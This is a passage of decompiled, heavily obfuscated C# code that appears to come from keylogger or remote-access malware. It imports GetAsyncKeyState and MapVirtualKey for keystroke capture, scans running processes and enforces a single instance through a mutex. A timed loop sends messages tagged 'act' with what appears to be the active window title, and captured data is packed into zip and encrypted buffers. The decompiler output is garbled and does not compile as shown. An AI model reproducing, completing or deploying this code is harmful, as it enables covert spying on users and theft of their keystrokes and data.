              goto label_37;
          }
          else
            goto label_32;
        }
label_8:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_11:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_15:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_22:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
        goto label_42;
label_26:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_32:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_37:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
        goto label_42;
label_40:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) num4;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<byte> local6 = (ValueType) num3;
        \u0003.\u0004.\u0005 obj2 = obj0;
        \u0003.\u0004.\u0002 obj3 = obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
label_42:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 8);
    }

    static int \u0001([In] \u0003.\u0004.\u0002 obj0)
    {
      int num;
      try
      {
        num = obj0.\u0003;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0002 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static void \u0001([In] \u0005.\u0002 obj0, [In] \u000E.\u0002 obj1, [In] string obj2, [In] string obj3)
    {
      \u0004.\u0006 obj4 = obj0.\u0001;
      \u0004.\u0006 obj5;
      if (true)
        obj5 = obj4;
      if (obj5 == null)
        return;
      obj5((object) obj0, new \u0004.\u0007(obj1, obj2, obj3));
    }

    static unsafe void \u0001([In] \u0003.\u0004.\u0007.\u0001 obj0, [In] \u0003.\u0004.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num1;
      try
      {
        if (true)
          goto label_26;
label_14:
        int num2 = num1;
        int num3 = num2 - 1;
label_15:
        num1 = num3;
        if (num2 > 0)
        {
          \u0006.\u0007.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 8));
          goto label_14;
        }
label_24:
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
        {
label_2:
          num1 = 1;
          *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
          if (false)
            goto label_5;
          else
            goto label_28;
label_4:
          if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 16))
            goto label_6;
label_5:
          \u0006.\u0007.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 16));
          num1 = 0;
label_6:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          int num4;
          int num5;
          do
          {
            if (true)
            {
              do
              {
                if (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
                {
                  *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
                  num4 = num1;
                  num5 = 1;
                  if (num5 == 0)
                    goto label_31;
                }
                else
                  break;
              }
              while ((num1 = num4 + num5) < *(int*) voidPtr);
            }
            else
              goto label_2;
          }
          while (false);
          if (num1 >= *(int*) ((IntPtr) voidPtr + 4))
          {
            if (*(int*) ((IntPtr) voidPtr + 8) != 0)
              \u0006.\u0007.\u0001(obj0, 16);
            else
              goto label_19;
label_18:
            \u0006.\u0007.\u0001(obj1.\u0001.\u0001, num1 - 3, 2);
            continue;
label_19:
            if (true)
            {
              if (true)
              {
                if (num1 <= 10)
                {
                  \u0006.\u0007.\u0001(obj0, 17);
                  \u0006.\u0007.\u0001(obj1.\u0001.\u0001, num1 - 3, 3);
                  continue;
                }
                \u0006.\u0007.\u0001(obj0, 18);
                \u0006.\u0007.\u0001(obj1.\u0001.\u0001, num1 - 11, 7);
                continue;
              }
              goto label_18;
            }
            else
              goto label_4;
          }
          else
            goto label_14;
label_31:
          num3 = num5;
          num2 = num4;
          goto label_15;
label_28:
          if (*(int*) ((IntPtr) voidPtr + 16) != 0)
          {
            *(int*) voidPtr = 6;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            goto label_4;
          }
          else
          {
            *(int*) voidPtr = 138;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            goto label_6;
          }
        }
        return;
label_26:
        *(int*) ((IntPtr) voidPtr + 8) = -1;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 12) = 0;
          goto label_24;
        }
        else
          goto label_14;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u0003.\u0004.\u0007.\u0001 obj2 = obj1;
        \u0003.\u0004.\u0007.\u0001 obj3 = obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
    }

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    static extern uint \u0001([In] uint obj0, [In] uint obj1);

    static unsafe byte[] \u0001([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(64);
      DateTime now;
      uint[] numArray1;
      uint num1;
      int num2;
      int length;
      \u0003.\u0004.\u000F obj4;
      byte[] bytes;
      \u0003.\u0004.\u0006 obj5;
      byte[] buffer1;
      byte[] buffer2;
      byte[] dst;
      \u0003.\u0004.\u0006 obj6;
      byte[] buffer3;
      byte[] buffer4;
      byte[] inputBuffer1;
      \u0006.\u0004 obj7;
      ICryptoTransform cryptoTransform1;
      byte[] buffer5;
      byte[] inputBuffer2;
      \u0003.\u0003 obj8;
      ICryptoTransform cryptoTransform2;
      byte[] buffer6;
      try
      {
        byte[] array;
        try
        {
          obj4 = new \u0003.\u0004.\u000F();
          switch (obj3)
          {
            case 0:
              \u0003.\u0004.\u0006 obj9 = new \u0003.\u0004.\u0006();
              if (true)
                obj5 = obj9;
              now = DateTime.Now;
              do
              {
                *(long*) voidPtr = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
                numArray1 = new uint[256]
                {
                  0U,
                  1996959894U,
                  3993919788U,
                  2567524794U,
                  124634137U,
                  1886057615U,
                  3915621685U,
                  2657392035U,
                  249268274U,
                  2044508324U,
                  3772115230U,
                  2547177864U,
                  162941995U,
                  2125561021U,
                  3887607047U,
                  2428444049U,
                  498536548U,
                  1789927666U,
                  4089016648U,
                  2227061214U,
                  450548861U,
                  1843258603U,
                  4107580753U,
                  2211677639U,
                  325883990U,
                  1684777152U,
                  4251122042U,
                  2321926636U,
                  335633487U,
                  1661365465U,
                  4195302755U,
                  2366115317U,
                  997073096U,
                  1281953886U,
                  3579855332U,
                  2724688242U,
                  1006888145U,
                  1258607687U,
                  3524101629U,
                  2768942443U,
                  901097722U,
                  1119000684U,
                  3686517206U,
                  2898065728U,
                  853044451U,
                  1172266101U,
                  3705015759U,
                  2882616665U,
                  651767980U,
                  1373503546U,
                  3369554304U,
                  3218104598U,
                  565507253U,
                  1454621731U,
                  3485111705U,
                  3099436303U,
                  671266974U,
                  1594198024U,
                  3322730930U,
                  2970347812U,
                  795835527U,
                  1483230225U,
                  3244367275U,
                  3060149565U,
                  1994146192U,
                  31158534U,
                  2563907772U,
                  4023717930U,
                  1907459465U,
                  112637215U,
                  2680153253U,
                  3904427059U,
                  2013776290U,
                  251722036U,
                  2517215374U,
                  3775830040U,
                  2137656763U,
                  141376813U,
                  2439277719U,
                  3865271297U,
                  1802195444U,
                  476864866U,
                  2238001368U,
                  4066508878U,
                  1812370925U,
                  453092731U,
                  2181625025U,
                  4111451223U,
                  1706088902U,
                  314042704U,
                  2344532202U,
                  4240017532U,
                  1658658271U,
                  366619977U,
                  2362670323U,
                  4224994405U,
                  1303535960U,
                  984961486U,
                  2747007092U,
                  3569037538U,
                  1256170817U,
                  1037604311U,
                  2765210733U,
                  3554079995U,
                  1131014506U,
                  879679996U,
                  2909243462U,
                  3663771856U,
                  1141124467U,
                  855842277U,
                  2852801631U,
                  3708648649U,
                  1342533948U,
                  654459306U,
                  3188396048U,
                  3373015174U,
                  1466479909U,
                  544179635U,
                  3110523913U,
                  3462522015U,
                  1591671054U,
                  702138776U,
                  2966460450U,
                  3352799412U,
                  1504918807U,
                  783551873U,
                  3082640443U,
                  3233442989U,
                  3988292384U,
                  2596254646U,
                  62317068U,
                  1957810842U,
                  3939845945U,
                  2647816111U,
                  81470997U,
                  1943803523U,
                  3814918930U,
                  2489596804U,
                  225274430U,
                  2053790376U,
                  3826175755U,
                  2466906013U,
                  167816743U,
                  2097651377U,
                  4027552580U,
                  2265490386U,
                  503444072U,
                  1762050814U,
                  4150417245U,
                  2154129355U,
                  426522225U,
                  1852507879U,
                  4275313526U,
                  2312317920U,
                  282753626U,
                  1742555852U,
                  4189708143U,
                  2394877945U,
                  397917763U,
                  1622183637U,
                  3604390888U,
                  2714866558U,
                  953729732U,
                  1340076626U,
                  3518719985U,
                  2797360999U,
                  1068828381U,
                  1219638859U,
                  3624741850U,
                  2936675148U,
                  906185462U,
                  1090812512U,
                  3747672003U,
                  2825379669U,
                  829329135U,
                  1181335161U,
                  3412177804U,
                  3160834842U,
                  628085408U,
                  1382605366U,
                  3423369109U,
                  3138078467U,
                  570562233U,
                  1426400815U,
                  3317316542U,
                  2998733608U,
                  733239954U,
                  1555261956U,
                  3268935591U,
                  3050360625U,
                  752459403U,
                  1541320221U,
                  2607071920U,
                  3965973030U,
                  1969922972U,
                  40735498U,
                  2617837225U,
                  3943577151U,
                  1913087877U,
                  83908371U,
                  2512341634U,
                  3803740692U,
                  2075208622U,
                  213261112U,
                  2463272603U,
                  3855990285U,
                  2094854071U,
                  198958881U,
                  2262029012U,
                  4057260610U,
                  1759359992U,
                  534414190U,
                  2176718541U,
                  4139329115U,
                  1873836001U,
                  414664567U,
                  2282248934U,
                  4279200368U,
                  1711684554U,
                  285281116U,
                  2405801727U,
                  4167216745U,
                  1634467795U,
                  376229701U,
                  2685067896U,
                  3608007406U,
                  1308918612U,
                  956543938U,
                  2808555105U,
                  3495958263U,
                  1231636301U,
                  1047427035U,
                  2932959818U,
                  3654703836U,
                  1088359270U,
                  936918000U,
                  2847714899U,
                  3736837829U,
                  1202900863U,
                  817233897U,
                  3183342108U,
                  3401237130U,
                  1404277552U,
                  615818150U,
                  3134207493U,
                  3453421203U,
                  1423857449U,
                  601450431U,
                  3009837614U,
                  3294710456U,
                  1567103746U,
                  711928724U,
                  3020668471U,
                  3272380065U,
                  1510334235U,
                  755167117U
                };
                *(int*) ((IntPtr) voidPtr + 40) = -1;
                num1 = *(uint*) ((IntPtr) voidPtr + 40);
                num2 = 0;
                length = obj1.Length;
                while (--length >= 0)
                  num1 = numArray1[(IntPtr) (uint) (((int) num1 ^ (int) obj1[num2++]) & (int) byte.MaxValue)] ^ num1 >> 8;
                num1 ^= *(uint*) ((IntPtr) voidPtr + 40);
                \u0006.\u0007.\u0001(obj4, 67324752);
                \u0006.\u0007.\u0001(obj4, 20);
                if (true)
                {
                  \u0006.\u0007.\u0001(obj4, 0);
                  \u0006.\u0007.\u0001(obj4, 8);
                  \u0006.\u0007.\u0001(obj4, (int) *(long*) voidPtr);
                  \u0006.\u0007.\u0001(obj4, (int) num1);
                  *(long*) ((IntPtr) voidPtr + 8) = obj4.Position;
                  \u0006.\u0007.\u0001(obj4, 0);
                  \u0006.\u0007.\u0001(obj4, obj1.Length);
                  bytes = Encoding.UTF8.GetBytes("{data}");
                  \u0006.\u0007.\u0001(obj4, bytes.Length);
                  \u0006.\u0007.\u0001(obj4, 0);
                  obj4.Write(bytes, 0, bytes.Length);
                  \u0006.\u0007.\u0001(obj5, obj1);
                  while (!\u0006.\u0007.\u0001(obj5))
                  {
                    buffer1 = new byte[512];
                    *(int*) ((IntPtr) voidPtr + 44) = \u0006.\u0007.\u0001(obj5, buffer1);
                    if (*(int*) ((IntPtr) voidPtr + 44) > 0)
                      obj4.Write(buffer1, 0, *(int*) ((IntPtr) voidPtr + 44));
                    else
                      break;
                  }
                  \u0006.\u0007.\u0001(obj5);
                  while (!\u0006.\u0007.\u0001(obj5))
                  {
                    buffer2 = new byte[512];
                    *(int*) ((IntPtr) voidPtr + 48) = \u0006.\u0007.\u0001(obj5, buffer2);
                    if (*(int*) ((IntPtr) voidPtr + 48) > 0)
                      obj4.Write(buffer2, 0, *(int*) ((IntPtr) voidPtr + 48));
                    else
                      break;
                  }
                  *(long*) ((IntPtr) voidPtr + 16) = \u0006.\u0007.\u0001(obj5);
                  \u0006.\u0007.\u0001(obj4, 33639248);
                  \u0006.\u0007.\u0001(obj4, 20);
                  \u0006.\u0007.\u0001(obj4, 20);
                  \u0006.\u0007.\u0001(obj4, 0);
                  \u0006.\u0007.\u0001(obj4, 8);
                }
                else
                  goto label_28;
              }
              while (false);
              \u0006.\u0007.\u0001(obj4, (int) *(long*) voidPtr);
              \u0006.\u0007.\u0001(obj4, (int) num1);
              \u0006.\u0007.\u0001(obj4, (int) *(long*) ((IntPtr) voidPtr + 16));
              \u0006.\u0007.\u0001(obj4, obj1.Length);
              \u0006.\u0007.\u0001(obj4, bytes.Length);
              \u0006.\u0007.\u0001(obj4, 0);
              \u0006.\u0007.\u0001(obj4, 0);
              \u0006.\u0007.\u0001(obj4, 0);
              \u0006.\u0007.\u0001(obj4, 0);
              \u0006.\u0007.\u0001(obj4, 0);
              \u0006.\u0007.\u0001(obj4, 0);
              obj4.Write(bytes, 0, bytes.Length);
              \u0006.\u0007.\u0001(obj4, 101010256);
              \u0006.\u0007.\u0001(obj4, 0);
              \u0006.\u0007.\u0001(obj4, 0);
              \u0006.\u0007.\u0001(obj4, 1);
              \u0006.\u0007.\u0001(obj4, 1);
              \u0006.\u0007.\u0001(obj4, 46 + bytes.Length);
              \u0006.\u0007.\u0001(obj4, (int) ((long) (30 + bytes.Length) + *(long*) ((IntPtr) voidPtr + 16)));
              \u0006.\u0007.\u0001(obj4, 0);
              do
              {
                obj4.Seek(*(long*) ((IntPtr) voidPtr + 8), SeekOrigin.Begin);
                \u0006.\u0007.\u0001(obj4, (int) *(long*) ((IntPtr) voidPtr + 16));
              }
              while (false);
              goto default;
            case 1:
              \u0006.\u0007.\u0001(obj4, 25000571);
              \u0006.\u0007.\u0001(obj4, obj1.Length);
              *(int*) ((IntPtr) voidPtr + 52) = 0;
              while (*(int*) ((IntPtr) voidPtr + 52) < obj1.Length)
              {
                dst = new byte[Math.Min(2097151, obj1.Length - *(int*) ((IntPtr) voidPtr + 52))];
                Buffer.BlockCopy((Array) obj1, *(int*) ((IntPtr) voidPtr + 52), (Array) dst, 0, dst.Length);
                *(long*) ((IntPtr) voidPtr + 24) = obj4.Position;
                \u0006.\u0007.\u0001(obj4, 0);
                \u0006.\u0007.\u0001(obj4, dst.Length);
                obj6 = new \u0003.\u0004.\u0006();
                \u0006.\u0007.\u0001(obj6, dst);
                while (!\u0006.\u0007.\u0001(obj6))
                {
                  buffer3 = new byte[512];
                  *(int*) ((IntPtr) voidPtr + 56) = \u0006.\u0007.\u0001(obj6, buffer3);
                  if (*(int*) ((IntPtr) voidPtr + 56) > 0)
                    obj4.Write(buffer3, 0, *(int*) ((IntPtr) voidPtr + 56));
                  else
                    break;
                }
                \u0006.\u0007.\u0001(obj6);
                while (!\u0006.\u0007.\u0001(obj6))
                {
                  buffer4 = new byte[512];
                  *(int*) ((IntPtr) voidPtr + 60) = \u0006.\u0007.\u0001(obj6, buffer4);
                  if (*(int*) ((IntPtr) voidPtr + 60) > 0)
                    obj4.Write(buffer4, 0, *(int*) ((IntPtr) voidPtr + 60));
                  else
                    break;
                }
                *(long*) ((IntPtr) voidPtr + 32) = obj4.Position;
                obj4.Position = *(long*) ((IntPtr) voidPtr + 24);
                \u0006.\u0007.\u0001(obj4, (int) \u0006.\u0007.\u0001(obj6));
                obj4.Position = *(long*) ((IntPtr) voidPtr + 32);
                *(int*) ((IntPtr) voidPtr + 52) = *(int*) ((IntPtr) voidPtr + 52) + dst.Length;
              }
              goto default;
            case 2:
              \u0006.\u0007.\u0001(obj4, 41777787);
              break;
            case 3:
              \u0006.\u0007.\u0001(obj4, 58555003);
              inputBuffer2 = \u0006.\u0007.\u0001((byte[]) null, obj1, (byte[]) null, 1);
              obj8 = new \u0003.\u0003();
              try
              {
                cryptoTransform2 = \u0006.\u0007.\u0001(obj0, obj8, false, obj2);
                try
                {
                  buffer6 = cryptoTransform2.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                  obj4.Write(buffer6, 0, buffer6.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform2?.Dispose();
                }
              }
              finally
              {
                ((IDisposable) obj8)?.Dispose();
              }
            default:
label_46:
              obj4.Flush();
              obj4.Close();
              array = obj4.ToArray();
              goto label_52;
          }
label_28:
          inputBuffer1 = \u0006.\u0007.\u0001((byte[]) null, obj1, (byte[]) null, 1);
          obj7 = new \u0006.\u0004();
          try
          {
            cryptoTransform1 = \u0006.\u0007.\u0001(false, obj2, obj7, obj0);
            try
            {
              buffer5 = cryptoTransform1.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
              obj4.Write(buffer5, 0, buffer5.Length);
              goto label_46;
            }
            finally
            {
              cryptoTransform1?.Dispose();
            }
          }
          finally
          {
            ((IDisposable) obj7)?.Dispose();
          }
        }
        catch (Exception ex)
        {
          \u0003.\u0004.\u0001 = "ERR 2003: " + ex.Message;
          throw;
        }
label_52:
        return array;
      }
      catch (Exception ex)
      {
        byte[] numArray2;
        object[] objArray = new object[39]
        {
          (object) obj4,
          (object) obj5,
          (object) now,
          (object) *(long*) voidPtr,
          (object) numArray1,
          (object) *(uint*) ((IntPtr) voidPtr + 40),
          (object) num1,
          (object) num2,
          (object) length,
          (object) *(long*) ((IntPtr) voidPtr + 8),
          (object) bytes,
          (object) buffer1,
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) buffer2,
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) *(long*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) dst,
          (object) *(long*) ((IntPtr) voidPtr + 24),
          (object) obj6,
          (object) buffer3,
          (object) *(int*) ((IntPtr) voidPtr + 56),
          (object) buffer4,
          (object) *(int*) ((IntPtr) voidPtr + 60),
          (object) *(long*) ((IntPtr) voidPtr + 32),
          (object) inputBuffer1,
          (object) obj7,
          (object) cryptoTransform1,
          (object) buffer5,
          (object) inputBuffer2,
          (object) obj8,
          (object) cryptoTransform2,
          (object) buffer6,
          (object) ex,
          (object) numArray2,
          (object) obj1,
          (object) obj3,
          (object) obj2,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static bool \u0001([In] \u0001 obj0) => obj0.\u0001;

    static Assembly \u0001()
    {
      Assembly assembly;
      try
      {
        assembly = \u0097.\u001B\u0003();
      }
      catch
      {
        assembly = (Assembly) null;
      }
      return assembly;
    }

    static bool \u0001([In] \u0003.\u0004.\u000E obj0)
    {
      bool flag;
      try
      {
        do
        {
          flag = obj0.\u0002 == 0;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u000E obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] \u0003.\u0004.\u0008 obj0)
    {
      int length;
      try
      {
        int num1 = obj0.\u0005;
        int num2 = 65274;
        if (num2 != 0)
        {
          if (num1 >= num2)
          {
            \u0006.\u0007.\u0001(obj0);
            if (false)
              return;
            goto label_7;
          }
          else
            goto label_7;
        }
label_5:
        length = num1 - num2;
label_6:
        Array.Copy((Array) obj0.\u0002, obj0.\u0008, (Array) obj0.\u0001, obj0.\u0005 + obj0.\u0006, length);
        obj0.\u0008 += length;
        obj0.\u0007 += length;
        obj0.\u0006 += length;
label_7:
        while (obj0.\u0006 >= 262 || obj0.\u0008 >= obj0.\u000E)
        {
          if (true)
          {
            if (obj0.\u0006 < 3)
              return;
            \u0006.\u0007.\u0001(obj0);
            return;
          }
        }
        length = 65536 - obj0.\u0006 - obj0.\u0005;
        if (length > obj0.\u000E - obj0.\u0008)
        {
          int num3 = obj0.\u000E;
          num2 = obj0.\u0008;
          num1 = num3;
          goto label_5;
        }
        else
          goto label_6;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) length;
        \u0003.\u0004.\u0008 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) local, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0006 obj0, [In] string obj1)
    {
      obj0.\u0001 = obj1;
      \u0012\u0002.\u007E\u0082\u0004((object) obj0.\u0001, false);
      obj0.\u0001 = (Image) \u0006.\u0007.\u0001(\u0018.\u007E\u0084((object) obj1) > 0 ? \u0006.\u0007.\u001F(2451) : \u0006.\u0007.\u001F(2446));
      obj0.\u0002 = true;
      obj0.\u0001 = true;
      if (\u0018.\u007E\u0084((object) obj1) > 0)
        \u000E\u0002.\u0011\u0004((object) obj0, 100);
      \u009B.\u007E\u0083\u0003((object) obj0);
    }

    static void \u0001([In] \u0005.\u0002 obj0, [In] \u000E.\u0002 obj1) => \u0006.\u0007.\u0001(obj0, obj1, string.Empty);

    [DllImport("user32", EntryPoint = "GetAsyncKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern short \u0001([In] int obj0);

    [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
    static extern int \u0001([In] int obj0);

    static unsafe void \u0001([In] \u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(12);
      if (true)
        goto label_57;
label_1:
      char[] chArray1;
      string[] strArray;
      string str1;
      object[] objArray1;
      Exception exception1;
      object obj1;
      Exception exception2;
      Exception exception3;
      Process[] processArray;
      void* voidPtr;
      Process process;
      Exception exception4;
      Exception exception5;
      Exception exception6;
      Exception exception7;
      object obj2;
      Exception exception8;
      string str2;
      Exception exception9;
      Exception exception10;
      object[] objArray2;
      bool[] flagArray1;
      object[] objArray3;
      object[] objArray4;
      bool[] flagArray2;
      Exception exception11;
      Exception exception12;
      Exception exception13;
      Exception exception14;
      try
      {
        obj0.\u0003 = obj0.\u0006;
        switch (\u008B.\u0002\u0003())
        {
          case null:
            \u0006.\u0007.\u0001(obj0);
            try
            {
              processArray = \u009A\u0002.\u001F\u0005();
              *(int*) ((IntPtr) voidPtr + 8) = 0;
              while (*(int*) ((IntPtr) voidPtr + 8) < processArray.Length)
              {
                process = processArray[*(int*) ((IntPtr) voidPtr + 8)];
                try
                {
                  FileInfo fileInfo = new FileInfo(\u001E.\u007E\u0007\u0002((object) \u009B\u0002.\u007E\u007F\u0005((object) process)));
                  if (\u0006.\u0007.\u0001((FileInfo) obj0.\u0001, fileInfo, obj0))
                  {
                    if (\u0018.\u007E\u0089((object) process) > \u0018.\u007E\u0089((object) \u0003\u0002.\u009E\u0003()))
                      global::\u0006.\u0007();
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  exception4 = ex;
                  global::\u0006.\u0006();
                }
                *(int*) ((IntPtr) voidPtr + 8) = checked (*(int*) unchecked ((IntPtr) voidPtr + 8) + 1);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              exception5 = ex;
              global::\u0006.\u0006();
            }
            try
            {
              Mutex mutex = \u009C\u0002.\u0080\u0005(obj0.\u0003);
              global::\u0006.\u0007();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              exception6 = ex;
              global::\u0006.\u0006();
            }
            try
            {
              obj0.\u0001 = new Mutex(true, obj0.\u0003);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              exception7 = ex;
              global::\u0006.\u0007();
              global::\u0006.\u0006();
            }
            obj2 = (object) new Thread(new ThreadStart(obj0.\u0001), 1);
            object obj3 = \u0011.\u001A(obj2, (System.Type) null, \u0006.\u0007.\u001F(2495), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            if (obj0.\u0001)
            {
              \u0003.\u0002 obj4 = obj0.\u0001;
              \u001D obj5 = \u001D.\u0099;
              string str3 = obj0.\u0006;
              chArray1 = new char[4]{ '.', 'e', 'x', 'e' };
              string str4 = new string(chArray1);
              string str5 = obj5(str3, str4);
              obj4.\u0001 = str5;
              \u0006.\u0007.\u0001(obj0.\u0001);
            }
            try
            {
              obj0.\u0001 = new \u0001();
              obj2 = (object) new Thread(new ThreadStart(obj0.\u0001.\u0001), 1);
              object obj6 = \u0011.\u001A(obj2, (System.Type) null, \u0006.\u0007.\u001F(2495), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              exception8 = ex;
              global::\u0006.\u0006();
            }
            *(int*) voidPtr = 0;
            *(int*) ((IntPtr) voidPtr + 4) = 0;
            str2 = \u0006.\u0007.\u001F(379);
            if (obj0.\u0002)
            {
              try
              {
                \u009D\u0002.\u0081\u0005(new SessionEndingEventHandler(obj0.\u0001));
                \u0006.\u0007.\u0001(obj0, 1);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                exception9 = ex;
                global::\u0006.\u0006();
              }
            }
            while (true)
            {
              \u001A.\u0095(1000);
              try
              {
                *(int*) voidPtr = checked (*(int*) voidPtr + 1);
                *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
                if (*(int*) voidPtr == 5)
                {
                  try
                  {
                    \u0006.\u0007.\u0001(\u009E\u0002.\u0082\u0005(\u0004\u0002.\u007E\u009F\u0003((object) \u0003\u0002.\u009E\u0003())));
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    exception10 = ex;
                    global::\u0006.\u0006();
                  }
                }
                if (*(int*) voidPtr > 10)
                {
                  *(int*) voidPtr = 0;
                  if (obj0.\u0003 && \u001C.\u0098(\u0006.\u0007.\u0001(obj0), str2, false) != 0)
                  {
                    str2 = \u0006.\u0007.\u0001(obj0);
                    if (str2 != null && \u0018.\u007E\u0084((object) str2) > 0)
                    {
                      \u0001 obj7 = obj0;
                      chArray1 = new char[3]
                      {
                        'a',
                        'c',
                        't'
                      };
                      string str6 = global::\u0004.\u0004(new string(chArray1), obj0.\u000E, str2);
                      \u0006.\u0007.\u0001(obj7, str6);
                    }
                  }
                }
                if (*(int*) ((IntPtr) voidPtr + 4) > 7)
                {
                  *(int*) ((IntPtr) voidPtr + 4) = 0;
                  try
                  {
                    \u0001 obj8 = \u0001.\u0001;
                    object obj9 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
                    string str7 = \u0006.\u0007.\u001F(839);
                    objArray1 = new object[2]
                    {
                      (object) obj0.\u0010,
                      (object) true
                    };
                    objArray2 = objArray1;
                    object[] objArray5 = objArray2;
                    flagArray1 = new bool[2]{ true, false };
                    bool[] flagArray3 = flagArray1;
                    object Instance = obj8(obj9, (System.Type) null, str7, objArray5, (string[]) null, (System.Type[]) null, flagArray3);
                    if (flagArray1[0])
                    {
                      // ISSUE: type reference
                      obj0.\u0010 = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
                    }
                    string MemberName = \u0006.\u0007.\u001F(2460);
                    objArray3 = new object[2]
                    {
                      (object) obj0.\u0006,
                      null
                    };
                    object[] objArray6 = objArray3;
                    global::\u000E obj10 = global::\u000E.\u0015;
                    object obj11 = global::\u000E.\u0015(global::\u000E.\u0015((object) '"', \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"');
                    chArray1 = new char[3]{ ' ', '.', '.' };
                    char[] chArray2 = chArray1;
